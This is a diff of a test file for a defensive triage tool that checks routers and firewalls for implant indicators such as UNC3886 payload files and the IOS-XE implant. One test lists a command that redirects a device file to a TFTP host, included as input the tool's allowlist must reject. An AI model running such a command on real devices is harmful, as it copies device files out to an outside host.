@@ -460,7 +460,8 @@ def test_every_implant_without_coverage_states_a_gap():
 
 
 # ------------------------------------------------------------------ new platforms (2026-10-22)
-NEW_PLATFORMS = [("junos", "junos", {}), ("cisco-iosxe", "iosxe", {"boot_image": "bootflash:packages.conf"}),
+IOSXE_PKG = "bootflash:isr4400-mono-universalk9.17.09.04a.SPA.pkg"
+NEW_PLATFORMS = [("junos", "junos", {}), ("cisco-iosxe", "iosxe", {"boot_image": IOSXE_PKG}),
                  ("f5-bigip", "f5", {}), ("checkpoint-gaia", "checkpoint", {})]
 
 
@@ -474,7 +475,7 @@ def test_new_platform_benign_is_not_called_clean(fx, tmp_path, profile, fixture,
 
 @pytest.mark.parametrize("profile,fixture,var,expected", [
     ("junos", "junos", {}, "COMPROMISED"),
-    ("cisco-iosxe", "iosxe", {"boot_image": "bootflash:packages.conf"}, "COMPROMISED"),
+    ("cisco-iosxe", "iosxe", {"boot_image": IOSXE_PKG}, "COMPROMISED"),
     ("f5-bigip", "f5", {}, "COMPROMISED"),
     ("checkpoint-gaia", "checkpoint", {}, "LIKELY-COMPROMISED"),
 ])
@@ -491,8 +492,26 @@ def test_junos_masquerade_matches_exact_names_only(fx, tmp_path):
     assert det(f, "junos-unc3886-tinyshell-yara")["status"] == "not-evaluated"   # no binaries via CLI
 
 
+def test_junos_listing_type_markers_do_not_hide_files(fx, tmp_path):
+    """Junos `file list` appends * and | markers; a pattern anchored on the bare name saw nothing."""
+    f = analyze(run(fx, tmp_path, "junos", "junos-compromised"))
+    assert det(f, "junos-unc3886-payload-files")["hit_count"] == 2      # ldb.b64 and loader.bin*
+    assert det(f, "junos-unc3886-null-fifo")["hit_count"] == 1          # null|
+    assert det(f, "junos-syslog-conf-backup")["hit_count"] == 1
+    assert det(f, "junos-hijacked-cat-process")["hit_count"] == 1
+
+
+def test_junos_integrity_check_is_not_impact_free():
+    """JMRT integrity-check writes a test file and syslog lines (Juniper), so it is opt-in."""
+    p = get_profile("junos")
+    step = next(s for s in p.steps if s.id == "jmrt_integrity_check")
+    assert step.impact == "vendor-bundle"
+    with pytest.raises(Exception):
+        p.check_command("request system malware-scan integrity-check")
+
+
 def test_iosxe_rwx_dirty_threshold_and_not_evaluated(fx, tmp_path):
-    f = analyze(run(fx, tmp_path, "cisco-iosxe", "iosxe-compromised", variables={"boot_image": "bootflash:packages.conf"}))
+    f = analyze(run(fx, tmp_path, "cisco-iosxe", "iosxe-compromised", variables={"boot_image": IOSXE_PKG}))
     r = det(f, "iosxe-iosd-rwx-dirty")
     assert r["hit_count"] == 1 and "12 kB" in r["hits"][0]["detail"]   # rw-p with dirty pages is normal, not a hit
     # An error instead of smaps must be 'not evaluated', never 'no hit'.
@@ -504,8 +523,33 @@ def test_iosxe_rwx_dirty_threshold_and_not_evaluated(fx, tmp_path):
         "% Invalid input detected at '^' marker.\n")
     case = Case(tmp_path / "IR-ERR")
     collect(get_profile("cisco-iosxe"), ReplayTransport(rp), case, case_id="IR-ERR", operator="t",
-            target={"host": "192.0.2.10"}, preflight={}, variables={"boot_image": "bootflash:packages.conf"})
+            target={"host": "192.0.2.10"}, preflight={}, variables={"boot_image": IOSXE_PKG})
     assert det(analyze(case.root), "iosxe-iosd-rwx-dirty")["status"] == "not-evaluated"
+
+
+def test_iosxe_switch_form_smaps_is_read(fx, tmp_path):
+    """Catalyst switches need the `switch active rp active` form; the router form errors there."""
+    import shutil
+    from edgetriage.util import slugify
+    rp = tmp_path / "sw"
+    shutil.copytree(fx / "iosxe-compromised", rp)
+    router = rp / "commands" / (slugify("show platform software process memory rp active name iosd smaps") + ".txt")
+    switch = rp / "commands" / (slugify("show platform software process memory switch active rp active name iosd smaps") + ".txt")
+    switch.write_text(router.read_text())
+    router.write_text("% Invalid input detected at '^' marker.\n")
+    case = Case(tmp_path / "IR-SW")
+    collect(get_profile("cisco-iosxe"), ReplayTransport(rp), case, case_id="IR-SW", operator="t",
+            target={"host": "192.0.2.10"}, preflight={}, variables={"boot_image": IOSXE_PKG})
+    r = det(analyze(case.root), "iosxe-iosd-rwx-dirty")
+    assert r["hit_count"] == 1 and r["hits"][0]["source"] == "step:iosd_smaps_switch"
+
+
+def test_iosxe_packages_conf_readable_but_not_writable():
+    p = get_profile("cisco-iosxe")
+    p.check_command("more bootflash:packages.conf")
+    for bad in ("more bootflash:x.conf | redirect tftp://192.0.2.1/x", "more bootflash:vlan.dat"):
+        with pytest.raises(Exception):
+            p.check_command(bad)
 
 
 def test_asa_error_output_is_not_evaluated(fx, tmp_path):
@@ -522,7 +566,7 @@ def test_asa_error_output_is_not_evaluated(fx, tmp_path):
 
 
 def test_iosxe_implant_check_response_confirms(fx, tmp_path):
-    root = run(fx, tmp_path, "cisco-iosxe", "iosxe-benign", variables={"boot_image": "bootflash:packages.conf"})
+    root = run(fx, tmp_path, "cisco-iosxe", "iosxe-benign", variables={"boot_image": IOSXE_PKG})
     case = Case(root)
     m = case.load()
     m["ingested"].append(case.ingest(fx / "iosxe-implant-check.txt", "implant-check"))
